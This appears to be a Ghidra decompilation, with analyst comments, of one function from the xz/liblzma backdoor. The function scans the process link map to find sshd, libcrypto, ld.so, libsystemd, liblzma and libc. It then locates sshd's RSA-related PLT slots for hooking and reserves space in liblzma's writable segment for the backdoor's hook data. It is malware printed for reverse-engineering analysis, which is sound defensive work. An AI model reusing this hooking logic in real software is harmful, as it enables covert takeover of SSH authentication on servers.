// /home/kali/xzre-ghidra/xzregh/104660_scan_link_map_and_init_shared_libs.c
// Function: scan_link_map_and_init_shared_libs @ 0x104660
// Calling convention: __stdcall
// Prototype: BOOL __stdcall scan_link_map_and_init_shared_libs(link_map * r_map, backdoor_shared_libraries_data_t * data)


/*
 * AutoDoc: Walks `_r_debug->r_map`, hashes each SONAME to an `EncodedStringId`, and refuses duplicate or malformed entries. Once sshd, libcrypto, ld.so, libsystemd, liblzma, and libc are all accounted for it parses the binaries in turn: sshd’s PLT yields the RSA hook slots, libcrypto/libc descriptors are primed for later import walks, liblzma’s writable PT_LOAD is recorded so the embedded `backdoor_hooks_data_t` blob can be accessed, and libc’s import table is populated via `resolve_libc_read_errno_imports`.
 */

#include "xzre_types.h"

BOOL scan_link_map_and_init_shared_libs(link_map *r_map,backdoor_shared_libraries_data_t *data)

{
  char path_char;
  void **rsa_get0_key_slot_ptr;
  void **evp_set1_rsa_slot_ptr;
  void **rsa_public_decrypt_slot_ptr;
  elf_info_t *elf_handle;
  link_map *link_map_cursor;
  backdoor_data_t *maps_state;
  backdoor_hooks_data_t **hooks_data_slot;
  EncodedStringId soname_id;
  BOOL success;
  Elf64_Sym *rtld_global_sym;
  uchar *rtld_global_base;
  ulong *plt_slot;
  void *liblzma_data_segment;
  char *soname_cursor;
  char *basename_ptr;
  u64 liblzma_data_segment_size;
  
  if (r_map == (link_map *)0x0) {
    return FALSE;
  }
  // AutoDoc: `rtld_global` guards any ld.so candidate we accept later in the walk.
  rtld_global_sym = elf_gnu_hash_lookup_symbol(data->elf_handles->ldso,STR_rtld_global,0);
  if (rtld_global_sym == (Elf64_Sym *)0x0) {
    return FALSE;
  }
  do {
    // AutoDoc: End-of-list checks insist every required module was seen before we bail out.
    if (*(ulong *)(r_map + 0x18) == 0) {
      maps_state = data->shared_maps;
      if (maps_state->sshd_link_map == (link_map *)0x0) {
        return FALSE;
      }
      if (maps_state->libcrypto_link_map == (link_map *)0x0) {
        return FALSE;
      }
      if (maps_state->ldso_link_map == (link_map *)0x0) {
        return FALSE;
      }
      if (maps_state->libsystemd_link_map == (link_map *)0x0) {
        return FALSE;
      }
      if (maps_state->liblzma_link_map == (link_map *)0x0) {
        return FALSE;
      }
      if (maps_state->libc_link_map == (link_map *)0x0) {
        return FALSE;
      }
      break;
    }
    if (*(ulong *)r_map == 0) {
      return FALSE;
    }
    soname_cursor = *(char **)(r_map + 8);
    if (soname_cursor == (char *)0x0) {
      return FALSE;
    }
    if (*(ulong *)(r_map + 0x10) == 0) {
      return FALSE;
    }
    basename_ptr = soname_cursor;
    if (*soname_cursor == '\0') {
      if (data->shared_maps->sshd_link_map != (link_map *)0x0) {
        return FALSE;
      }
      data->shared_maps->sshd_link_map = r_map;
    }
    else {
      while (path_char = *soname_cursor, path_char != '\0') {
        soname_cursor = soname_cursor + 1;
        if (path_char == '/') {
          basename_ptr = soname_cursor;
        }
      }
      // AutoDoc: Collapse the SONAME into an enum so the classifier can switch over IDs instead of strings.
      soname_id = encoded_string_id_lookup(basename_ptr,soname_cursor);
      maps_state = data->shared_maps;
      if (soname_id == STR_libc_so) {
        if (maps_state->libc_link_map != (link_map *)0x0) {
          return FALSE;
        }
        maps_state->libc_link_map = r_map;
      }
      else if (soname_id < 0x7d1) {
        // AutoDoc: liblzma needs extra scrutiny (address sanity + `l_next`) before we trust the entry.
        if (soname_id == STR_liblzma_so) {
          if (maps_state->liblzma_link_map != (link_map *)0x0) {
            return FALSE;
          }
          if (0x10465f < *(ulong *)r_map) {
            return FALSE;
          }
          if ((code *)(*(ulong *)r_map + 0x400000) < scan_link_map_and_init_shared_libs) {
            return FALSE;
          }
          if (*(ulong *)(r_map + 0x18) == 0) {
            return FALSE;
          }
          maps_state->liblzma_link_map = r_map;
        }
        else if (soname_id == STR_libcrypto_so) {
          if (maps_state->libcrypto_link_map != (link_map *)0x0) {
            return FALSE;
          }
          maps_state->libcrypto_link_map = r_map;
        }
      }
      else if (soname_id == STR_libsystemd_so) {
        if (maps_state->libsystemd_link_map != (link_map *)0x0) {
          return FALSE;
        }
        maps_state->libsystemd_link_map = r_map;
      }
      else if (soname_id == STR_ld_linux_x86_64_so) {
        if (maps_state->ldso_link_map != (link_map *)0x0) {
          return FALSE;
        }
        elf_handle = data->elf_handles->ldso;
        rtld_global_base = elf_handle->elfbase->e_ident + rtld_global_sym->st_value;
        if (r_map <= rtld_global_base) {
          return FALSE;
        }
        if (rtld_global_sym->st_size < (ulong)((long)r_map - (long)rtld_global_base)) {
          return FALSE;
        }
        // AutoDoc: For ld.so entries verify the cached dynamic segment matches the runtime `l_info[DT_*]` pointer.
        if (*(Elf64_Dyn **)(r_map + 0x10) != elf_handle->dynamic_segment) {
          return FALSE;
        }
        maps_state->ldso_link_map = r_map;
      }
    }
    maps_state = data->shared_maps;
    r_map = *(link_map **)(r_map + 0x18);
  } while ((((maps_state->sshd_link_map == (link_map *)0x0) ||
            (maps_state->libcrypto_link_map == (link_map *)0x0)) ||
           (maps_state->ldso_link_map == (link_map *)0x0)) ||
          (((maps_state->libsystemd_link_map == (link_map *)0x0 ||
            (maps_state->liblzma_link_map == (link_map *)0x0)) ||
           (maps_state->libc_link_map == (link_map *)0x0))));
  rsa_get0_key_slot_ptr = data->rsa_get0_key_slot;
  evp_set1_rsa_slot_ptr = data->evp_set1_rsa_slot;
  rsa_public_decrypt_slot_ptr = data->rsa_public_decrypt_slot;
  elf_handle = data->elf_handles->sshd;
  link_map_cursor = data->shared_maps->sshd_link_map;
  if (link_map_cursor == (link_map *)0x0) {
    return FALSE;
  }
  success = elf_info_parse(*(Elf64_Ehdr **)link_map_cursor,elf_handle);
  if (success == FALSE) {
    return FALSE;
  }
  if (elf_handle->gnurelro_present == FALSE) {
    return FALSE;
  }
  if ((elf_handle->feature_flags & 0x20) == 0) {
    return FALSE;
  }
  // AutoDoc: Record sshd’s RSA PLT slots so the hook installer knows exactly which GOT entries to patch.
  plt_slot = (ulong *)elf_find_plt_reloc_slot(elf_handle,STR_RSA_public_decrypt);
  *rsa_public_decrypt_slot_ptr = plt_slot;
  if (plt_slot < (ulong *)0x1000000) {
    plt_slot = (ulong *)elf_find_plt_reloc_slot(elf_handle,STR_EVP_PKEY_set1_RSA);
    *evp_set1_rsa_slot_ptr = plt_slot;
    if (((ulong *)0xffffff < plt_slot) && (0xffffff < *plt_slot)) {
      return FALSE;
    }
    plt_slot = (ulong *)elf_find_plt_reloc_slot(elf_handle,STR_RSA_get0_key);
    *rsa_get0_key_slot_ptr = plt_slot;
    if (plt_slot < (ulong *)0x1000000) goto LAB_00104924;
  }
  if (0xffffff < *plt_slot) {
    return FALSE;
  }
LAB_00104924:
  link_map_cursor = data->shared_maps->libcrypto_link_map;
  if ((link_map_cursor != (link_map *)0x0) &&
     (success = elf_info_parse(*(Elf64_Ehdr **)link_map_cursor,data->elf_handles->libcrypto), success != FALSE)
     ) {
    hooks_data_slot = data->hooks_data_slot;
    liblzma_data_segment_size = 0;
    elf_handle = data->elf_handles->liblzma;
    link_map_cursor = data->shared_maps->liblzma_link_map;
    if ((link_map_cursor != (link_map *)0x0) &&
       (((success = elf_info_parse(*(Elf64_Ehdr **)link_map_cursor,elf_handle), success != FALSE &&
         ((elf_handle->feature_flags & 0x20) != 0)) &&
        // AutoDoc: Cache liblzma’s writable PT_LOAD and make sure the hooks blob plus scratch space fit inside it.
        (liblzma_data_segment = elf_get_writable_tail_span(elf_handle,&liblzma_data_segment_size,TRUE), 0x597 < liblzma_data_segment_size)))) {
      *hooks_data_slot = (backdoor_hooks_data_t *)((long)liblzma_data_segment + 0x10);
      // AutoDoc: Publish how much writable padding remains after the hooks blob so later stages can borrow it.
      *(u64 *)((long)liblzma_data_segment + 0x590) = liblzma_data_segment_size - 0x598;
      link_map_cursor = data->shared_maps->libc_link_map;
      if ((link_map_cursor != (link_map *)0x0) &&
         (success = elf_info_parse(*(Elf64_Ehdr **)link_map_cursor,data->elf_handles->libc), success != FALSE))
      {
        // AutoDoc: Once libc’s `link_map` is parsed, immediately resolve the `read`/`__errno_location` trampolines.
        success = resolve_libc_read_errno_imports
                           (data->shared_maps->libc_link_map,data->elf_handles->libc,
                            data->libc_imports);
        return (uint)(success != FALSE);
      }
    }
  }
  return FALSE;
}

